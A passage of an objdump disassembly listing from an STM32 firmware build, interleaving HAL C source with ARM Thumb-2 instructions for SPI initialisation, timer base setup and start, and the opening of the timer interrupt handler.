    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b1c:	687b      	ldr	r3, [r7, #4]
 8004b1e:	2200      	movs	r2, #0
 8004b20:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004b22:	687b      	ldr	r3, [r7, #4]
 8004b24:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004b28:	b2db      	uxtb	r3, r3
 8004b2a:	2b00      	cmp	r3, #0
 8004b2c:	d106      	bne.n	8004b3c <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004b2e:	687b      	ldr	r3, [r7, #4]
 8004b30:	2200      	movs	r2, #0
 8004b32:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004b36:	6878      	ldr	r0, [r7, #4]
 8004b38:	f7fc f8cc 	bl	8000cd4 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004b3c:	687b      	ldr	r3, [r7, #4]
 8004b3e:	2202      	movs	r2, #2
 8004b40:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004b44:	687b      	ldr	r3, [r7, #4]
 8004b46:	681b      	ldr	r3, [r3, #0]
 8004b48:	681a      	ldr	r2, [r3, #0]
 8004b4a:	687b      	ldr	r3, [r7, #4]
 8004b4c:	681b      	ldr	r3, [r3, #0]
 8004b4e:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004b52:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004b54:	687b      	ldr	r3, [r7, #4]
 8004b56:	68db      	ldr	r3, [r3, #12]
 8004b58:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b5c:	d902      	bls.n	8004b64 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004b5e:	2300      	movs	r3, #0
 8004b60:	60fb      	str	r3, [r7, #12]
 8004b62:	e002      	b.n	8004b6a <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004b64:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004b68:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004b6a:	687b      	ldr	r3, [r7, #4]
 8004b6c:	68db      	ldr	r3, [r3, #12]
 8004b6e:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004b72:	d007      	beq.n	8004b84 <HAL_SPI_Init+0xa0>
 8004b74:	687b      	ldr	r3, [r7, #4]
 8004b76:	68db      	ldr	r3, [r3, #12]
 8004b78:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b7c:	d002      	beq.n	8004b84 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b7e:	687b      	ldr	r3, [r7, #4]
 8004b80:	2200      	movs	r2, #0
 8004b82:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004b84:	687b      	ldr	r3, [r7, #4]
 8004b86:	685b      	ldr	r3, [r3, #4]
 8004b88:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004b8c:	687b      	ldr	r3, [r7, #4]
 8004b8e:	689b      	ldr	r3, [r3, #8]
 8004b90:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004b94:	431a      	orrs	r2, r3
 8004b96:	687b      	ldr	r3, [r7, #4]
 8004b98:	691b      	ldr	r3, [r3, #16]
 8004b9a:	f003 0302 	and.w	r3, r3, #2
 8004b9e:	431a      	orrs	r2, r3
 8004ba0:	687b      	ldr	r3, [r7, #4]
 8004ba2:	695b      	ldr	r3, [r3, #20]
 8004ba4:	f003 0301 	and.w	r3, r3, #1
 8004ba8:	431a      	orrs	r2, r3
 8004baa:	687b      	ldr	r3, [r7, #4]
 8004bac:	699b      	ldr	r3, [r3, #24]
 8004bae:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004bb2:	431a      	orrs	r2, r3
 8004bb4:	687b      	ldr	r3, [r7, #4]
 8004bb6:	69db      	ldr	r3, [r3, #28]
 8004bb8:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004bbc:	431a      	orrs	r2, r3
 8004bbe:	687b      	ldr	r3, [r7, #4]
 8004bc0:	6a1b      	ldr	r3, [r3, #32]
 8004bc2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004bc6:	ea42 0103 	orr.w	r1, r2, r3
 8004bca:	687b      	ldr	r3, [r7, #4]
 8004bcc:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004bce:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004bd2:	687b      	ldr	r3, [r7, #4]
 8004bd4:	681b      	ldr	r3, [r3, #0]
 8004bd6:	430a      	orrs	r2, r1
 8004bd8:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004bda:	687b      	ldr	r3, [r7, #4]
 8004bdc:	699b      	ldr	r3, [r3, #24]
 8004bde:	0c1b      	lsrs	r3, r3, #16
 8004be0:	f003 0204 	and.w	r2, r3, #4
 8004be4:	687b      	ldr	r3, [r7, #4]
 8004be6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004be8:	f003 0310 	and.w	r3, r3, #16
 8004bec:	431a      	orrs	r2, r3
 8004bee:	687b      	ldr	r3, [r7, #4]
 8004bf0:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004bf2:	f003 0308 	and.w	r3, r3, #8
 8004bf6:	431a      	orrs	r2, r3
 8004bf8:	687b      	ldr	r3, [r7, #4]
 8004bfa:	68db      	ldr	r3, [r3, #12]
 8004bfc:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c00:	ea42 0103 	orr.w	r1, r2, r3
 8004c04:	68fb      	ldr	r3, [r7, #12]
 8004c06:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c0a:	687b      	ldr	r3, [r7, #4]
 8004c0c:	681b      	ldr	r3, [r3, #0]
 8004c0e:	430a      	orrs	r2, r1
 8004c10:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c12:	687b      	ldr	r3, [r7, #4]
 8004c14:	2200      	movs	r2, #0
 8004c16:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004c18:	687b      	ldr	r3, [r7, #4]
 8004c1a:	2201      	movs	r2, #1
 8004c1c:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004c20:	2300      	movs	r3, #0
}
 8004c22:	4618      	mov	r0, r3
 8004c24:	3710      	adds	r7, #16
 8004c26:	46bd      	mov	sp, r7
 8004c28:	bd80      	pop	{r7, pc}

08004c2a <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004c2a:	b580      	push	{r7, lr}
 8004c2c:	b082      	sub	sp, #8
 8004c2e:	af00      	add	r7, sp, #0
 8004c30:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004c32:	687b      	ldr	r3, [r7, #4]
 8004c34:	2b00      	cmp	r3, #0
 8004c36:	d101      	bne.n	8004c3c <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004c38:	2301      	movs	r3, #1
 8004c3a:	e049      	b.n	8004cd0 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004c3c:	687b      	ldr	r3, [r7, #4]
 8004c3e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004c42:	b2db      	uxtb	r3, r3
 8004c44:	2b00      	cmp	r3, #0
 8004c46:	d106      	bne.n	8004c56 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004c48:	687b      	ldr	r3, [r7, #4]
 8004c4a:	2200      	movs	r2, #0
 8004c4c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004c50:	6878      	ldr	r0, [r7, #4]
 8004c52:	f7fc f943 	bl	8000edc <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004c56:	687b      	ldr	r3, [r7, #4]
 8004c58:	2202      	movs	r2, #2
 8004c5a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004c5e:	687b      	ldr	r3, [r7, #4]
 8004c60:	681a      	ldr	r2, [r3, #0]
 8004c62:	687b      	ldr	r3, [r7, #4]
 8004c64:	3304      	adds	r3, #4
 8004c66:	4619      	mov	r1, r3
 8004c68:	4610      	mov	r0, r2
 8004c6a:	f000 fa7d 	bl	8005168 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004c6e:	687b      	ldr	r3, [r7, #4]
 8004c70:	2201      	movs	r2, #1
 8004c72:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004c76:	687b      	ldr	r3, [r7, #4]
 8004c78:	2201      	movs	r2, #1
 8004c7a:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004c7e:	687b      	ldr	r3, [r7, #4]
 8004c80:	2201      	movs	r2, #1
 8004c82:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004c86:	687b      	ldr	r3, [r7, #4]
 8004c88:	2201      	movs	r2, #1
 8004c8a:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004c8e:	687b      	ldr	r3, [r7, #4]
 8004c90:	2201      	movs	r2, #1
 8004c92:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004c96:	687b      	ldr	r3, [r7, #4]
 8004c98:	2201      	movs	r2, #1
 8004c9a:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004c9e:	687b      	ldr	r3, [r7, #4]
 8004ca0:	2201      	movs	r2, #1
 8004ca2:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004ca6:	687b      	ldr	r3, [r7, #4]
 8004ca8:	2201      	movs	r2, #1
 8004caa:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004cae:	687b      	ldr	r3, [r7, #4]
 8004cb0:	2201      	movs	r2, #1
 8004cb2:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004cb6:	687b      	ldr	r3, [r7, #4]
 8004cb8:	2201      	movs	r2, #1
 8004cba:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004cbe:	687b      	ldr	r3, [r7, #4]
 8004cc0:	2201      	movs	r2, #1
 8004cc2:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004cc6:	687b      	ldr	r3, [r7, #4]
 8004cc8:	2201      	movs	r2, #1
 8004cca:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004cce:	2300      	movs	r3, #0
}
 8004cd0:	4618      	mov	r0, r3
 8004cd2:	3708      	adds	r7, #8
 8004cd4:	46bd      	mov	sp, r7
 8004cd6:	bd80      	pop	{r7, pc}

08004cd8 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004cd8:	b480      	push	{r7}
 8004cda:	b085      	sub	sp, #20
 8004cdc:	af00      	add	r7, sp, #0
 8004cde:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004ce0:	687b      	ldr	r3, [r7, #4]
 8004ce2:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004ce6:	b2db      	uxtb	r3, r3
 8004ce8:	2b01      	cmp	r3, #1
 8004cea:	d001      	beq.n	8004cf0 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004cec:	2301      	movs	r3, #1
 8004cee:	e03b      	b.n	8004d68 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004cf0:	687b      	ldr	r3, [r7, #4]
 8004cf2:	2202      	movs	r2, #2
 8004cf4:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004cf8:	687b      	ldr	r3, [r7, #4]
 8004cfa:	681b      	ldr	r3, [r3, #0]
 8004cfc:	68da      	ldr	r2, [r3, #12]
 8004cfe:	687b      	ldr	r3, [r7, #4]
 8004d00:	681b      	ldr	r3, [r3, #0]
 8004d02:	f042 0201 	orr.w	r2, r2, #1
 8004d06:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d08:	687b      	ldr	r3, [r7, #4]
 8004d0a:	681b      	ldr	r3, [r3, #0]
 8004d0c:	4a19      	ldr	r2, [pc, #100]	; (8004d74 <HAL_TIM_Base_Start_IT+0x9c>)
 8004d0e:	4293      	cmp	r3, r2
 8004d10:	d009      	beq.n	8004d26 <HAL_TIM_Base_Start_IT+0x4e>
 8004d12:	687b      	ldr	r3, [r7, #4]
 8004d14:	681b      	ldr	r3, [r3, #0]
 8004d16:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004d1a:	d004      	beq.n	8004d26 <HAL_TIM_Base_Start_IT+0x4e>
 8004d1c:	687b      	ldr	r3, [r7, #4]
 8004d1e:	681b      	ldr	r3, [r3, #0]
 8004d20:	4a15      	ldr	r2, [pc, #84]	; (8004d78 <HAL_TIM_Base_Start_IT+0xa0>)
 8004d22:	4293      	cmp	r3, r2
 8004d24:	d115      	bne.n	8004d52 <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004d26:	687b      	ldr	r3, [r7, #4]
 8004d28:	681b      	ldr	r3, [r3, #0]
 8004d2a:	689a      	ldr	r2, [r3, #8]
 8004d2c:	4b13      	ldr	r3, [pc, #76]	; (8004d7c <HAL_TIM_Base_Start_IT+0xa4>)
 8004d2e:	4013      	ands	r3, r2
 8004d30:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d32:	68fb      	ldr	r3, [r7, #12]
 8004d34:	2b06      	cmp	r3, #6
 8004d36:	d015      	beq.n	8004d64 <HAL_TIM_Base_Start_IT+0x8c>
 8004d38:	68fb      	ldr	r3, [r7, #12]
 8004d3a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004d3e:	d011      	beq.n	8004d64 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004d40:	687b      	ldr	r3, [r7, #4]
 8004d42:	681b      	ldr	r3, [r3, #0]
 8004d44:	681a      	ldr	r2, [r3, #0]
 8004d46:	687b      	ldr	r3, [r7, #4]
 8004d48:	681b      	ldr	r3, [r3, #0]
 8004d4a:	f042 0201 	orr.w	r2, r2, #1
 8004d4e:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d50:	e008      	b.n	8004d64 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004d52:	687b      	ldr	r3, [r7, #4]
 8004d54:	681b      	ldr	r3, [r3, #0]
 8004d56:	681a      	ldr	r2, [r3, #0]
 8004d58:	687b      	ldr	r3, [r7, #4]
 8004d5a:	681b      	ldr	r3, [r3, #0]
 8004d5c:	f042 0201 	orr.w	r2, r2, #1
 8004d60:	601a      	str	r2, [r3, #0]
 8004d62:	e000      	b.n	8004d66 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d64:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004d66:	2300      	movs	r3, #0
}
 8004d68:	4618      	mov	r0, r3
 8004d6a:	3714      	adds	r7, #20
 8004d6c:	46bd      	mov	sp, r7
 8004d6e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004d72:	4770      	bx	lr
 8004d74:	40012c00 	.word	0x40012c00
 8004d78:	40014000 	.word	0x40014000
 8004d7c:	00010007 	.word	0x00010007

08004d80 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004d80:	b580      	push	{r7, lr}
 8004d82:	b084      	sub	sp, #16
 8004d84:	af00      	add	r7, sp, #0
 8004d86:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004d88:	687b      	ldr	r3, [r7, #4]
 8004d8a:	681b      	ldr	r3, [r3, #0]
 8004d8c:	68db      	ldr	r3, [r3, #12]
 8004d8e:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004d90:	687b      	ldr	r3, [r7, #4]
 8004d92:	681b      	ldr	r3, [r3, #0]
 8004d94:	691b      	ldr	r3, [r3, #16]
 8004d96:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004d98:	68bb      	ldr	r3, [r7, #8]
 8004d9a:	f003 0302 	and.w	r3, r3, #2
 8004d9e:	2b00      	cmp	r3, #0
 8004da0:	d020      	beq.n	8004de4 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004da2:	68fb      	ldr	r3, [r7, #12]
 8004da4:	f003 0302 	and.w	r3, r3, #2
 8004da8:	2b00      	cmp	r3, #0
 8004daa:	d01b      	beq.n	8004de4 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004dac:	687b      	ldr	r3, [r7, #4]
 8004dae:	681b      	ldr	r3, [r3, #0]
 8004db0:	f06f 0202 	mvn.w	r2, #2
 8004db4:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004db6:	687b      	ldr	r3, [r7, #4]
 8004db8:	2201      	movs	r2, #1
 8004dba:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004dbc:	687b      	ldr	r3, [r7, #4]
 8004dbe:	681b      	ldr	r3, [r3, #0]
 8004dc0:	699b      	ldr	r3, [r3, #24]
 8004dc2:	f003 0303 	and.w	r3, r3, #3
 8004dc6:	2b00      	cmp	r3, #0
 8004dc8:	d003      	beq.n	8004dd2 <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004dca:	6878      	ldr	r0, [r7, #4]
 8004dcc:	f000 f9ad 	bl	800512a <HAL_TIM_IC_CaptureCallback>
 8004dd0:	e005      	b.n	8004dde <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004dd2:	6878      	ldr	r0, [r7, #4]
 8004dd4:	f000 f99f 	bl	8005116 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004dd8:	6878      	ldr	r0, [r7, #4]
 8004dda:	f000 f9b0 	bl	800513e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	2200      	movs	r2, #0
 8004de2:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004de4:	68bb      	ldr	r3, [r7, #8]
 8004de6:	f003 0304 	and.w	r3, r3, #4
 8004dea:	2b00      	cmp	r3, #0
 8004dec:	d020      	beq.n	8004e30 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004dee:	68fb      	ldr	r3, [r7, #12]
 8004df0:	f003 0304 	and.w	r3, r3, #4
 8004df4:	2b00      	cmp	r3, #0
 8004df6:	d01b      	beq.n	8004e30 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004df8:	687b      	ldr	r3, [r7, #4]
 8004dfa:	681b      	ldr	r3, [r3, #0]
 8004dfc:	f06f 0204 	mvn.w	r2, #4
 8004e00:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e02:	687b      	ldr	r3, [r7, #4]
 8004e04:	2202      	movs	r2, #2
 8004e06:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e08:	687b      	ldr	r3, [r7, #4]
 8004e0a:	681b      	ldr	r3, [r3, #0]
 8004e0c:	699b      	ldr	r3, [r3, #24]
 8004e0e:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e12:	2b00      	cmp	r3, #0
 8004e14:	d003      	beq.n	8004e1e <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e16:	6878      	ldr	r0, [r7, #4]
 8004e18:	f000 f987 	bl	800512a <HAL_TIM_IC_CaptureCallback>
 8004e1c:	e005      	b.n	8004e2a <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e1e:	6878      	ldr	r0, [r7, #4]
 8004e20:	f000 f979 	bl	8005116 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e24:	6878      	ldr	r0, [r7, #4]
 8004e26:	f000 f98a 	bl	800513e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e2a:	687b      	ldr	r3, [r7, #4]
 8004e2c:	2200      	movs	r2, #0
 8004e2e:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004e30:	68bb      	ldr	r3, [r7, #8]
 8004e32:	f003 0308 	and.w	r3, r3, #8
 8004e36:	2b00      	cmp	r3, #0
 8004e38:	d020      	beq.n	8004e7c <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004e3a:	68fb      	ldr	r3, [r7, #12]
 8004e3c:	f003 0308 	and.w	r3, r3, #8
 8004e40:	2b00      	cmp	r3, #0
 8004e42:	d01b      	beq.n	8004e7c <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004e44:	687b      	ldr	r3, [r7, #4]
 8004e46:	681b      	ldr	r3, [r3, #0]
 8004e48:	f06f 0208 	mvn.w	r2, #8
 8004e4c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004e4e:	687b      	ldr	r3, [r7, #4]
 8004e50:	2204      	movs	r2, #4
 8004e52:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004e54:	687b      	ldr	r3, [r7, #4]
 8004e56:	681b      	ldr	r3, [r3, #0]
 8004e58:	69db      	ldr	r3, [r3, #28]
 8004e5a:	f003 0303 	and.w	r3, r3, #3
 8004e5e:	2b00      	cmp	r3, #0
 8004e60:	d003      	beq.n	8004e6a <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e62:	6878      	ldr	r0, [r7, #4]
 8004e64:	f000 f961 	bl	800512a <HAL_TIM_IC_CaptureCallback>
 8004e68:	e005      	b.n	8004e76 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e6a:	6878      	ldr	r0, [r7, #4]
 8004e6c:	f000 f953 	bl	8005116 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e70:	6878      	ldr	r0, [r7, #4]
 8004e72:	f000 f964 	bl	800513e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e76:	687b      	ldr	r3, [r7, #4]
 8004e78:	2200      	movs	r2, #0
 8004e7a:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004e7c:	68bb      	ldr	r3, [r7, #8]
 8004e7e:	f003 0310 	and.w	r3, r3, #16
 8004e82:	2b00      	cmp	r3, #0
 8004e84:	d020      	beq.n	8004ec8 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004e86:	68fb      	ldr	r3, [r7, #12]
 8004e88:	f003 0310 	and.w	r3, r3, #16
 8004e8c:	2b00      	cmp	r3, #0
 8004e8e:	d01b      	beq.n	8004ec8 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004e90:	687b      	ldr	r3, [r7, #4]
 8004e92:	681b      	ldr	r3, [r3, #0]
 8004e94:	f06f 0210 	mvn.w	r2, #16
 8004e98:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004e9a:	687b      	ldr	r3, [r7, #4]
 8004e9c:	2208      	movs	r2, #8
